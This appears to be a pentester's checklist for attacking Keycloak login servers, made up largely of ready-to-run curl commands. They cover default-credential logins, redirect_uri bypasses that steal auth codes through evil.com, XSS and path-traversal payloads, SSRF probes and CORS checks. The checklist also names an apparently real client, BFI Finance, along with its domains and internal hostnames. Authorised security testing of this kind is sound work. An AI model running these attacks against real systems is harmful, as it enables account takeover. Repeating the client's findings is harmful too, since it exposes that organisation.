# Keycloak Assessment (Black-Box)

Systematic approach to testing Keycloak instances during external penetration tests. Includes version fingerprinting, CVE-specific checks, and common false positives.

## Time Budget

**Maximum 15-20 minutes per Keycloak instance.** If the first 3-4 vectors fail cleanly (proper error handling, auth enforced, no info leak), mark as hardened and move on.

## Version Fingerprinting

### Resource Hash Method

Keycloak serves static resources at `/resources/{hash}/`. The hash changes per version:

```bash
KC="https://target.com"
hash=$(curl -s "${KC}/admin/master/console/" | grep -o '/resources/[^/"]*' | head -1 | cut -d'/' -f3)
echo "Resource hash: $hash"
```

Known mappings (partial — update as new versions release):
| Hash | Version Range | Notes |
|------|--------------|-------|
| s18l1 | 24.x - 25.x | Quarkus-based, Account Console v3 |
| s17l1 | 23.x | Quarkus-based |
| s16l1 | 22.x | First Quarkus-only release |
| 9p2s1 | 20.x - 21.x | WildFly-based (legacy) |

### Deployment Type Detection

| Indicator | Deployment |
|-----------|-----------|
| `/auth/realms/...` prefix required | WildFly (legacy, pre-v20) |
| `/realms/...` works directly | Quarkus (modern, v20+) |
| Account Console v3 (keycloak.v3) | v24+ |
| Account Console v2 (keycloak.v2) | v19-v23 |

### Realm Discovery

```bash
# Try common realm names
for realm in master app company-name bfi bravo production default; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${KC}/realms/${realm}/.well-known/openid-configuration" --max-time 5)
  [ "$code" = "200" ] && echo "  ✅ Realm found: ${realm}"
done
```

## Testing Checklist (ordered by likelihood of success)

### 1. Admin Console Access (2 min)

```bash
# Check if admin console is accessible
curl -s -o /dev/null -w "%{http_code}" "${KC}/admin/master/console/"
# 200 = accessible (need creds), 404 = disabled, 403 = IP-restricted
```

### 2. Default Credentials (1 min)

```bash
# Try admin/admin (only on non-production or experiment instances)
curl -s -X POST "${KC}/realms/master/protocol/openid-connect/token" \
  -d "grant_type=password&client_id=admin-cli&username=admin&password=admin"
```
If this returns a token → CRITICAL finding.

### 3. Client Registration (2 min)

```bash
# Try to register a new OIDC client
curl -s -o /dev/null -w "%{http_code}" -X POST \
  "${KC}/realms/master/clients-registrations/openid-connect" \
  -H "Content-Type: application/json" \
  -d '{"redirect_uris":["http://localhost"],"client_name":"test"}'
# 403 = trusted hosts policy (hardened)
# 201 = client registered! (finding)
# 401 = requires initial access token
```

### 4. Open Redirect via redirect_uri (5 min) — CRITICAL VECTOR

**Why this matters more than typical open redirects:** If a public client (no client_secret) accepts arbitrary redirect_uri, an attacker can steal the authorization code after legitimate login and exchange it for a valid JWT — full account takeover without knowing the victim's password.

```bash
# Test redirect_uri validation strictness on ALL public clients
# First identify public clients:
for client in "admin-cli" "account" "account-console"; do
  resp=$(curl -sk -X POST "${KC}/realms/${REALM}/protocol/openid-connect/token" \
    -d "grant_type=client_credentials&client_id=$client&client_secret=test")
  echo "$resp" | grep -q "Public client not allowed" && echo "  PUBLIC: $client"
  echo "$resp" | grep -q "Invalid client" && echo "  INVALID/CONFIDENTIAL: $client"
done

# Test redirect_uri validation on each public client
for client in "admin-cli" "account" "${APP_CLIENT_ID}"; do
  echo "=== Client: $client ==="
  for uri in \
    "https://evil.com" \
    "https://target.com.evil.com" \
    "https://target.com@evil.com" \
    "https://evil.com/target.com" \
    "https://target.com%40evil.com" \
    "https://target.com/../../evil.com" \
    "//evil.com"; do
    # KEY: Check if LOGIN PAGE is shown (not error page)
    # Login page = redirect_uri ACCEPTED (will redirect after auth)
    # Error page = redirect_uri REJECTED (safe)
    body=$(curl -sk "${KC}/realms/${REALM}/protocol/openid-connect/auth?client_id=${client}&redirect_uri=${uri}&response_type=code&scope=openid")
    if echo "$body" | grep -qiE "sign in|login|kc-form|username"; then
      echo "  ✓ ACCEPTED (login shown): $uri → VULNERABLE"
    elif echo "$body" | grep -qi "error"; then
      echo "  ✗ REJECTED (error): $uri"
    fi
  done
done
```

**Detection method:** Do NOT rely on HTTP status codes (302 vs 400). Modern Keycloak returns 200 with either a login page (accepted) or error page (rejected). Check the response BODY for login form indicators.

**Attack chain (if redirect_uri accepted on public client):**
```bash
# 1. Attacker crafts phishing link:
#    https://auth.target.com/realms/REALM/protocol/openid-connect/auth?
#      client_id=PUBLIC_CLIENT&redirect_uri=https://evil.com/steal&response_type=code&scope=openid
# 2. Victim clicks → sees legitimate login page (domain is auth.target.com)
# 3. Victim authenticates (Google SSO, password, etc.)
# 4. Keycloak redirects to: https://evil.com/steal?code=AUTH_CODE
# 5. Attacker exchanges code for JWT (no client_secret needed for public clients):
curl -X POST "${KC}/realms/${REALM}/protocol/openid-connect/token" \
  -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=${PUBLIC_CLIENT}&redirect_uri=https://evil.com/steal"
# Returns: {"access_token":"eyJ...", "refresh_token":"..."}
```

**Severity determination:**
- Public client + arbitrary redirect_uri accepted → **Critical** (full account takeover via phishing)
- Confidential client + arbitrary redirect_uri → **High** (still open redirect, but code exchange needs client_secret)
- Only subdomain variations accepted (e.g., `*.target.com`) → **Medium** (needs XSS on any subdomain to chain)

**Real-world example (BFI Finance, May 2026):**
- `auth.bfi.co.id` accepted `https://evil.com` for ALL public clients (admin-cli, account, los-operation, los-surveyor)
- `los-operation` is a public client (no secret needed for code exchange)
- Combined with CORS reflection on /userinfo → silent identity theft after token obtained
- Rated Critical 8.1

### 5. Path Traversal to Admin API (3 min)

```bash
# CVE-2024-1132 style
for path in "/realms/master/..;/admin/realms/master/users" \
            "/realms/master/account/..%2F..%2Fadmin/realms/master/users"; do
  # MUST use Accept: application/json to distinguish real API response from SPA catch-all
  resp=$(curl -s -w "\n%{http_code}" "${KC}${path}" -H "Accept: application/json" --max-time 10)
  code=$(echo "$resp" | tail -1)
  echo "  ${path:0:60} → HTTP $code"
  # 401 = auth enforced (not vulnerable)
  # 200 with JSON array = CRITICAL (admin API exposed)
  # 200 with HTML = SPA catch-all (false positive, see below)
done
```

### 6. XSS via Parameters (3 min)

```bash
# Test reflection in error pages
for payload in \
  "/realms/master/protocol/openid-connect/auth?client_id=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&response_type=code&redirect_uri=http://localhost" \
  "/realms/master/login-actions/detached-info?kc_locale=%22onmouseover%3dalert(1)%22" \
  "/realms/master/protocol/openid-connect/logout?redirect_uri=javascript:alert(1)"; do
  resp=$(curl -s "${KC}${payload}" --max-time 10)
  # Check for UNENCODED reflection of our exact payload
  if echo "$resp" | grep -F '<script>alert(1)</script>' >/dev/null 2>&1; then
    echo "  ⚠️ XSS CONFIRMED: ${payload:0:60}"
  elif echo "$resp" | grep -F 'javascript:alert(1)' >/dev/null 2>&1; then
    echo "  ⚠️ XSS CONFIRMED: ${payload:0:60}"
  fi
done
```

### 7. Token Exchange / SSRF (2 min)

```bash
WEBHOOK="https://webhook.site/YOUR-UUID"

# Token exchange (may trigger outbound request)
curl -s -X POST "${KC}/realms/master/protocol/openid-connect/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=fake&audience=${WEBHOOK}&client_id=admin-cli"
# 400 "not enabled" = hardened
# 200 with token = finding (token exchange enabled)

# Backchannel logout
curl -s -X POST "${KC}/realms/master/protocol/openid-connect/logout" \
  -d "backchannel_logout_uri=${WEBHOOK}/keycloak-backchannel"
# Check webhook for incoming request
```

### 8. Metrics / Health Endpoints (1 min)

```bash
for path in "/metrics" "/health" "/health/ready" "/health/live"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${KC}${path}" --max-time 5)
  [ "$code" != "404" ] && echo "  ${path} → HTTP $code"
done
# 200 on /metrics = info disclosure (Prometheus metrics)
# 403 = blocked (hardened)
```

### 9. CORS Origin Reflection on Sensitive Endpoints (3 min)

```bash
# Test if Keycloak reflects arbitrary origins with credentials
# This is CRITICAL if /userinfo reflects — enables cross-origin identity theft
for endpoint in \
  "/realms/${REALM}/protocol/openid-connect/userinfo" \
  "/realms/${REALM}/.well-known/openid-configuration" \
  "/realms/${REALM}/protocol/openid-connect/token" \
  "/realms/${REALM}/"; do
  echo "=== ${endpoint} ==="
  for origin in "https://evil.com" "null" "https://localhost"; do
    acao=$(curl -sk -H "Origin: $origin" -D- "${KC}${endpoint}" 2>&1 | grep -i "access-control-allow-origin")
    acac=$(curl -sk -H "Origin: $origin" -D- "${KC}${endpoint}" 2>&1 | grep -i "access-control-allow-credentials")
    if [ -n "$acao" ]; then
      echo "  Origin: $origin → $acao | $acac"
    fi
  done
done
# ACAO reflecting arbitrary origin + ACAC: true = CRITICAL
# Especially on /userinfo — any page can steal logged-in user identity
# The "null" origin is exploitable via sandboxed iframes
```

**Severity guidance:**
- `/userinfo` reflects origin + credentials → **Critical** (identity theft, session hijacking)
- `.well-known/openid-configuration` reflects → Medium (info disclosure, no auth data)
- `/token` reflects → Critical (if combined with valid credentials, enables cross-origin token theft)
- Realm root reflects → Medium (metadata only)

**Note:** `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is a browser-level contradiction (browsers ignore credentials with wildcard). But `ACAO: <reflected_origin>` with `ACAC: true` IS exploitable. The distinction matters for severity.

**Token endpoint preflight exploitation:** When the token endpoint responds to OPTIONS with `Access-Control-Allow-Methods: POST, OPTIONS` + `Access-Control-Allow-Headers: ... Content-Type, Authorization` + reflected origin + credentials:true, an attacker's JavaScript can perform cross-origin POST to exchange authorization codes or refresh tokens. This elevates CORS from info-disclosure to full session theft. Verify with:
```bash
curl -sk -X OPTIONS -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  "${KC}/realms/${REALM}/protocol/openid-connect/token" -D- | grep -i "access-control"
# Look for: allow-methods: POST, allow-headers: Content-Type, allow-origin: evil.com, allow-credentials: true
```

**Root cause:** Often caused by Istio/Envoy CorsPolicy with `allowOrigins: [{regex: ".*"}]` or Keycloak realm-level Web Origins set to `*`. Fix requires restricting to specific trusted origins at both mesh and application level.

### 10. Hidden Realm Discovery via Prometheus Metrics (2 min)

If any service in the same cluster exposes `/actuator/prometheus` (even on mock/SIT), mine it for Keycloak realm names:

```bash
# Search Prometheus metrics for Keycloak realm references
curl -sk "https://mock-service.target.com/actuator/prometheus" | \
  grep -oP 'uri="/keycloak/realms/[^/]+'  | sort -u
# Also check http_client_requests labels for internal Keycloak URLs
curl -sk "https://mock-service.target.com/actuator/prometheus" | \
  grep "keycloak" | grep -v "^#"
```

In the BFI engagement, this technique discovered a `bpm` realm that was invisible to direct enumeration (only `master` and `bravo` were found via brute-force). The `bpm` realm had password grant, device_code, and CIBA enabled — a significant additional attack surface.

**Also check:** `client_name` labels reveal which internal hostname the service uses to reach Keycloak (e.g., `microservices.sit.bravo.bfi.co.id`), confirming the gateway path.

## False Positive Detection

### SPA Catch-All (Most Common False Positive)

The Account Console is a Single Page Application. It returns the same HTML shell (same byte count) for ANY path under `/realms/{realm}/account/`:

```bash
# Verify SPA catch-all
size1=$(curl -s "${KC}/realms/master/account/" | wc -c)
size2=$(curl -s "${KC}/realms/master/account/doesnotexist" | wc -c)
size3=$(curl -s "${KC}/realms/master/account/foo/bar/baz" | wc -c)
# If all three are identical → SPA catch-all, NOT a real endpoint
```

**Rule:** If path traversal via `/account/..%2F..%2F` returns 200 with `Content-Type: text/html` and same byte count as `/account/` → it's the SPA catch-all, NOT admin API access.

**Real admin API access** returns:
- `Content-Type: application/json`
- JSON array (for list endpoints) or JSON object
- Different byte counts per endpoint

### 302 to Login ≠ Access

Many paths return 302 redirecting to the login page. This means:
- The path EXISTS (not 404)
- But auth is REQUIRED (not bypassed)
- Document as "admin console accessible" (informational), not as a vulnerability

## CVE Quick Reference

| CVE | Version Affected | Vector | Check |
|-----|-----------------|--------|-------|
| CVE-2024-3656 | < 24.0.5 | Admin API access via low-privilege token | Need valid user token |
| CVE-2024-1132 | < 22.0.10, < 24.0.4 | Path traversal via redirect_uri | Test with encoded ..%2F |
| CVE-2023-6927 | < 23.0.3 | Open redirect via redirect_uri | Test external URIs |
| CVE-2023-6134 | < 22.0.7 | XSS via redirect_uri | Check reflection |
| CVE-2023-2585 | < 21.1.2 | Client registration bypass | Try without initial access token |
| CVE-2022-1245 | < 18.0.0 | Privilege escalation via admin API | Very old, unlikely |

## Reporting

### If Keycloak is hardened (most common outcome)

Document as a **positive finding** in the report's "Strengths" section:
- Trusted hosts policy active
- No default credentials
- Token exchange disabled
- Strict redirect_uri validation
- Admin console requires valid credentials

### If vulnerabilities found

| Finding | Severity | Condition |
|---------|----------|-----------|
| Default credentials work | Critical | admin/admin returns token |
| Client registration open | High | Can register arbitrary clients |
| Path traversal to admin API (JSON data returned) | Critical | Unauthenticated admin access |
| Open redirect (public client, no PKCE) | Critical | Arbitrary redirect_uri + public client = auth code theft |
| Open redirect (confidential client) | High | Arbitrary redirect_uri accepted but code exchange needs secret |
| Open redirect (subdomain-only bypass) | Medium | Only *.target.com variations accepted |
| XSS reflected | Medium | Unencoded payload in HTML |
| Metrics endpoint exposed | Low | Prometheus metrics readable |
| Token exchange enabled | Medium | Can exchange tokens without proper validation |
| CORS origin reflection + credentials on /userinfo | Critical | Cross-origin identity theft |

## Environment Considerations

- **nonprod/experiment instances** — findings may not apply to production. Tag findings with environment.
- **If Keycloak is the OIDC provider for all microservices** — note that compromise = access to everything. This is an architectural risk even if Keycloak itself is hardened.
- **Multiple Keycloak instances** — test each separately, they may have different configurations.
